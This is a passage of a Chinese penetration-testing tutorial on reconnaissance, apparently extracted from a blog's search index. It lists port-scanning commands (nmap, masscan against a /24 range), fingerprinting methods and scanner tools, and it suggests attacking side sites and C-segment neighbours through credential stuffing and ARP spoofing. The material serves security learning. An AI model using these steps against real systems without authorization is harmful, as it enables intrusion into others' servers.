6、爬虫-中国菜刀","date":"2024-04-26","objectID":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/:33:0","series":null,"tags":["信息收集","总结"],"title":"万字总结信息收集全网最全","uri":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/#6爬虫-中国菜刀"},{"categories":["学习"],"content":" 7、wwwscan","date":"2024-04-26","objectID":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/:34:0","series":null,"tags":["信息收集","总结"],"title":"万字总结信息收集全网最全","uri":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/#7wwwscan"},{"categories":["学习"],"content":" 8、cansina","date":"2024-04-26","objectID":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/:35:0","series":null,"tags":["信息收集","总结"],"title":"万字总结信息收集全网最全","uri":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/#8cansina"},{"categories":["学习"],"content":" 9、dirmap","date":"2024-04-26","objectID":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/:36:0","series":null,"tags":["信息收集","总结"],"title":"万字总结信息收集全网最全","uri":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/#9dirmap"},{"categories":["学习"],"content":" 10、Webdirscan","date":"2024-04-26","objectID":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/:37:0","series":null,"tags":["信息收集","总结"],"title":"万字总结信息收集全网最全","uri":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/#10webdirscan"},{"categories":["学习"],"content":" 11、BBscan","date":"2024-04-26","objectID":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/:38:0","series":null,"tags":["信息收集","总结"],"title":"万字总结信息收集全网最全","uri":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/#11bbscan"},{"categories":["学习"],"content":" 12、GSIL","date":"2024-04-26","objectID":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/:39:0","series":null,"tags":["信息收集","总结"],"title":"万字总结信息收集全网最全","uri":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/#12gsil"},{"categories":["学习"],"content":" 六、端口扫描通过端口扫描可以判断出网站开启的服务，从而通过爆破枚举或者漏洞利用进行突破，进一步提升网站权限，常见的如 135 、137 、138 、139 、445，这几个端口经常爆发漏洞。 扫描到的端口也许是网站的一个旁站，可以尝试对旁站进行漏洞探测，但是有些服务开启的端口可能被管理员修改，通过手工判断分析即可（例如开启了8888端口，通过尝试远程桌面连接确定该端口为3389修改过的端口）。 ","date":"2024-04-26","objectID":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/:40:0","series":null,"tags":["信息收集","总结"],"title":"万字总结信息收集全网最全","uri":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/#六端口扫描"},{"categories":["学习"],"content":" windows下的命令显示一个所有的有效连接信息列表，包括已建立的连接（ESTABLISHED ），也包括监听连接请求（LISTENING ）的那些连接， 断开连接（CLOSE_WAIT ）或者处于联机等待状态的（TIME_WAIT ）等 ：netstat -a 以数字形式显示地址和端口号,显示所有已建立的有效连接：netstat -n 列出所有端口的情况：netstat -ano 查看被占用端口80对应的应用的PID：netstat -ano|findstr “80” 查看80端口被哪个进程或程序占用：tasklist|findstr “80” 结束该进程或程序：taskkill /f /t /im XX.exe ","date":"2024-04-26","objectID":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/:41:0","series":null,"tags":["信息收集","总结"],"title":"万字总结信息收集全网最全","uri":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/#windows下的命令"},{"categories":["学习"],"content":" 1、各服务开启的默认端口以及攻击方向 ","date":"2024-04-26","objectID":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/:42:0","series":null,"tags":["信息收集","总结"],"title":"万字总结信息收集全网最全","uri":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/#1各服务开启的默认端口以及攻击方向"},{"categories":["学习"],"content":" 2、在线查询网站http://coolaf.com/tool/port https://tool.lu/portscan/index.html ","date":"2024-04-26","objectID":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/:43:0","series":null,"tags":["信息收集","总结"],"title":"万字总结信息收集全网最全","uri":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/#2在线查询网站"},{"categories":["学习"],"content":" 3、端口扫描工具端口扫描工具常见有nmap和masscan。nmap扫描的准确性较高，但是扫描的比较慢。masscan扫描的比较快，但是准确性较低，如果网站存在WAF可以通过调节扫描线程或者利用FTP连接工具、SSH连接工具、Mysql连接等工具进行手工探测 ","date":"2024-04-26","objectID":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/:44:0","series":null,"tags":["信息收集","总结"],"title":"万字总结信息收集全网最全","uri":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/#3端口扫描工具"},{"categories":["学习"],"content":" 3.1、nmap(zmap)Nmap扫描中一些常见的服务 msmq? ：默认对于的是1801端口，是 MSMQ Microsoft Message Queuing微软消息队列的简称，是windows系统提供的一个功能，开启了该功能，则默认1801端口打开。该服务暂未发现漏洞。 msrpc：Microsoft Remote Procedure Call微软远程过程调用，是 Windows 操作系统使用的一个协议。RPC 提供一种内部进程通讯机制，允许在一台电脑上运行的程序无缝的执行远程系统中的代码。 tcpwrapped：端口状态后经常标记tcpwrapped。tcpwrapped表示服务器运行 tcp_wrappers服务。tcp_wrappers是一种应用级防火墙。它可以根据预设，对SSH、Telnet、FTP服务的请求进行拦截，判断是否符合预设要求。如果符合，就会转发给对应的服务进程；否则，会中断连接请求。这说明tcp三次握手已经完成，但是并没有和目标主机建立连接。这表明，虽然目标主机的某项服务是可提供的，但你不在允许访问主机的名单列表中。当大量的端口服务都为tcpwrapped时，这说明可能是有负载均衡或者防火墙阻断了你的连接请求。 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)：这是SQL Server中的SQL Reporting Service 服务使用的Microsoft HTTPAPI。 ","date":"2024-04-26","objectID":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/:44:1","series":null,"tags":["信息收集","总结"],"title":"万字总结信息收集全网最全","uri":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/#31nmapzmap"},{"categories":["学习"],"content":" 3.2、masscan","date":"2024-04-26","objectID":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/:44:2","series":null,"tags":["信息收集","总结"],"title":"万字总结信息收集全网最全","uri":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/#32masscan"},{"categories":["学习"],"content":" 3.3、ScanPort通过ping等方式获取网站IP，然后开始扫描 ","date":"2024-04-26","objectID":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/:44:3","series":null,"tags":["信息收集","总结"],"title":"万字总结信息收集全网最全","uri":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/#33scanport"},{"categories":["学习"],"content":" 3.4、webrobot ","date":"2024-04-26","objectID":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/:44:4","series":null,"tags":["信息收集","总结"],"title":"万字总结信息收集全网最全","uri":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/#34webrobot"},{"categories":["学习"],"content":" 七、旁站C段旁站：是和目标网站在同一台服务器上的其它网站 C端：是和服务器IP处在一个C段的其他服务器 对于防护比较强的主站，通常是很难挖掘到漏洞的，这时需要查看该站点的旁站，通过探测旁站的漏洞进行利用，从而拿下主站的权限。 当网站不存在旁站时，就需要进行C段探测（有些网站买断了相邻的几个IP做为分站，如果拿到分站的管理员敏感信息，如密码之类的，可以尝试对主站进行撞库），通过拿下C段中服务器进行ARP欺骗达到劫持域名的效果 对于红蓝对抗和护网，C段扫描比较有意义。对于单独网站的渗透测试，C段扫描意义不大。C段指的是同一内网段内的其他服务器，每个IP有ABCD四个段，举个例子，192.168.0.1，A段就是192，B段是168，C段是0，D段是1，而C段嗅探的意思就是拿下它同一C段中的其中一台服务器，也就是说是D段1-255中的一台服务器，然后利用工具嗅探拿下该服务器。 ","date":"2024-04-26","objectID":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/:45:0","series":null,"tags":["信息收集","总结"],"title":"万字总结信息收集全网最全","uri":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/#七旁站c段"},{"categories":["学习"],"content":" 1、在线查询","date":"2024-04-26","objectID":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/:46:0","series":null,"tags":["信息收集","总结"],"title":"万字总结信息收集全网最全","uri":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/#1在线查询"},{"categories":["学习"],"content":" 1.1、站点http://s.tool.chinaz.com/same https://dns.aizhan.com/ http://www.5kik.com/c/ ？登不上 https://webscan.cc/ ","date":"2024-04-26","objectID":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/:46:1","series":null,"tags":["信息收集","总结"],"title":"万字总结信息收集全网最全","uri":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/#11站点"},{"categories":["学习"],"content":" 1.2、Google Hacking、Bingsite:125.125.125.* http://cn.bing.com/search?q=ip:111.111.111.111 ","date":"2024-04-26","objectID":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/:46:2","series":null,"tags":["信息收集","总结"],"title":"万字总结信息收集全网最全","uri":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/#12google-hackingbing"},{"categories":["学习"],"content":" 1.2、网络空间搜索引擎fofa、shodan在线工具 语法:ip=“106.15.141.18/24” ","date":"2024-04-26","objectID":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/:46:3","series":null,"tags":["信息收集","总结"],"title":"万字总结信息收集全网最全","uri":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/#12网络空间搜索引擎"},{"categories":["学习"],"content":" 2、探测工具","date":"2024-04-26","objectID":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/:47:0","series":null,"tags":["信息收集","总结"],"title":"万字总结信息收集全网最全","uri":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/#2探测工具"},{"categories":["学习"],"content":" 2.1、K8Cscanhttps://github.com/k8gege/K8CScan ","date":"2024-04-26","objectID":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/:47:1","series":null,"tags":["信息收集","总结"],"title":"万字总结信息收集全网最全","uri":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/#21k8cscan"},{"categories":["学习"],"content":" 2.2、nmap、masscannmap -p 22,21,443,8080-Pn 172.178.40.0/24 nmap -p 80,8080 –open ip/24 masscan -p 22,21,443,8080-Pn –rate=1000172.178.40.0/24 ","date":"2024-04-26","objectID":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/:47:2","series":null,"tags":["信息收集","总结"],"title":"万字总结信息收集全网最全","uri":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/#22nmapmasscan"},{"categories":["学习"],"content":" 2.3、goby","date":"2024-04-26","objectID":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/:47:3","series":null,"tags":["信息收集","总结"],"title":"万字总结信息收集全网最全","uri":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/#23goby"},{"categories":["学习"],"content":" 2.4、御剑","date":"2024-04-26","objectID":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/:47:4","series":null,"tags":["信息收集","总结"],"title":"万字总结信息收集全网最全","uri":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/#24御剑"},{"categories":["学习"],"content":" 2.5、北极熊扫描器","date":"2024-04-26","objectID":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/:47:5","series":null,"tags":["信息收集","总结"],"title":"万字总结信息收集全网最全","uri":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/#25北极熊扫描器"},{"categories":["学习"],"content":" 2.6、通过手动ping","date":"2024-04-26","objectID":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/:47:6","series":null,"tags":["信息收集","总结"],"title":"万字总结信息收集全网最全","uri":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/#26通过手动ping"},{"categories":["学习"],"content":" 八、整站分析","date":"2024-04-26","objectID":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/:48:0","series":null,"tags":["信息收集","总结"],"title":"万字总结信息收集全网最全","uri":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/#八整站分析"},{"categories":["学习"],"content":" 1、服务器类型服务器信息包括服务器用的操作系统：Linux 还是 Windows 。现在企业网站服务器的操作系统有百分之九十以上用的是Linux操作系统。知道了服务器的操作系统之后，还需要知道操作系统使用的具体版本。因为很多低版本的操作系统都存在已知的漏洞。 判断是Linux还是Windows最简单就是通过ping来探测，Windows的TTL值都是一般是128，Linux则是64。所以大于100的肯定是Windows，而几十的肯定是Linux。但是，通过TTL值来判断服务器类型也不是百分之百准确的，有些windows服务器的TTL值也是几十，而且有的服务器禁止ping。 而判断目标网站服务器的具体的版本的话，可以采用 nmap 进行扫描， -O 和 -A 参数都能扫描出来 检测服务器平台、版本等，获取后可以制定漏洞挖掘方案（如IIS6.0存在解析漏洞等）。 将首页或者其他页面通过修改大小写辨别网站所使用的系统： 区分大小写（页面报错）–Linux 不区分大小写（页面正常）–Windows ","date":"2024-04-26","objectID":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/:49:0","series":null,"tags":["信息收集","总结"],"title":"万字总结信息收集全网最全","uri":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/#1服务器类型"},{"categories":["学习"],"content":" 1.1、 云悉WEB资产梳理 http://www.yunsee.cn/，根据IIS版本判断Windows系统，系统对应版本通过搜索引擎查找。 注：使用AppScan、WVS等扫描工具也可以判断。 ","date":"2024-04-26","objectID":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/:49:1","series":null,"tags":["信息收集","总结"],"title":"万字总结信息收集全网最全","uri":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/#11-云悉web资产梳理"},{"categories":["学习"],"content":" 2、网站容器知道了这些信息之后，我们就需要知道网站用的web服务器是什么类型的：Apache、Nginx、Tomcat 还是 IIS。知道了web服务器是哪种类型后，我们还要探测web服务器具体的版本。比如Ngnix版本\u003c0.83会有解析漏洞 ，IIS6.0会有文件名解析漏洞、IIS7.0会有畸形解析漏洞等。不同的web服务器版本，存在着不同漏洞。 搭建网站的服务组件，例如：iis、Apache、nginx、tomcat等，通过网站容器判断存在的漏洞（如：Apache解析漏洞，nginx解析漏洞）。 ","date":"2024-04-26","objectID":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/:50:0","series":null,"tags":["信息收集","总结"],"title":"万字总结信息收集全网最全","uri":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/#2网站容器"},{"categories":["学习"],"content":" 2.1、火狐渗透测试浏览器 ","date":"2024-04-26","objectID":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/:50:1","series":null,"tags":["信息收集","总结"],"title":"万字总结信息收集全网最全","uri":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/#21火狐渗透测试浏览器"},{"categories":["学习"],"content":" 2.2、云悉WEB资产梳理\\","date":"2024-04-26","objectID":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/:50:2","series":null,"tags":["信息收集","总结"],"title":"万字总结信息收集全网最全","uri":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/#22云悉web资产梳理"},{"categories":["学习"],"content":" 2.3、脚本类型我们需要知道网站用的脚本类型：php 、Jsp 、Asp 、Aspx 。 1）可以根据网站URL来判断 2）site:xxx filetype:php 3）可以根据Firefox的插件来判断 ","date":"2024-04-26","objectID":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/:51:0","series":null,"tags":["信息收集","总结"],"title":"万字总结信息收集全网最全","uri":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/#23脚本类型"},{"categories":["学习"],"content":" 3.1、通过修改首页文件后缀查看页面响应判断通过修改index.xxx后缀内容（为ASP\\ASPX\\PHP\\JSP），查看页面返回情况，页面返回正常便可以判断脚本类型，判断脚本类型是信息收集中最基本的工作之一。 ","date":"2024-04-26","objectID":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/:51:1","series":null,"tags":["信息收集","总结"],"title":"万字总结信息收集全网最全","uri":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/#31通过修改首页文件后缀查看页面响应判断"},{"categories":["学习"],"content":" 3.2、通过搜索框查找相关文章辨别脚本类型在网站搜索框中输入任意字符，查询后，通过浏览器上的URL判断网站脚本类型。 ","date":"2024-04-26","objectID":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/:51:2","series":null,"tags":["信息收集","总结"],"title":"万字总结信息收集全网最全","uri":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/#32通过搜索框查找相关文章辨别脚本类型"},{"categories":["学习"],"content":" 3.3、通过爬虫工具爬取网站目录判断网站脚本类型Webrobot ","date":"2024-04-26","objectID":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/:51:3","series":null,"tags":["信息收集","总结"],"title":"万字总结信息收集全网最全","uri":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/#33通过爬虫工具爬取网站目录判断网站脚本类型"},{"categories":["学习"],"content":" 4、CMS类型在渗透测试中，对目标服务器进行指纹识别是相当有必要的，因为只有识别出相应的Web容器或者CMS，才能查找与其相关的漏洞，然后才能进行相应的渗透操作。这是我们想要识别这些网站的指纹，我们就可以利用以下一些指纹识别在线网站。 识别dedecms、phpcms、emlog、帝国cms等，通过网站使用的CMS找取该CMS已经公布的漏洞进行利用，进一步渗透网站。 ","date":"2024-04-26","objectID":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/:52:0","series":null,"tags":["信息收集","总结"],"title":"万字总结信息收集全网最全","uri":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/#4cms类型"},{"categories":["学习"],"content":" 4.1、云悉指纹https://www.yunsee.cn/ ","date":"2024-04-26","objectID":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/:52:1","series":null,"tags":["信息收集","总结"],"title":"万字总结信息收集全网最全","uri":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/#41云悉指纹"},{"categories":["学习"],"content":" 4.2、ThreatScanhttps://scan.top15.cn/web/ ","date":"2024-04-26","objectID":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/:52:2","series":null,"tags":["信息收集","总结"],"title":"万字总结信息收集全网最全","uri":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/#42threatscan"},{"categories":["学习"],"content":" 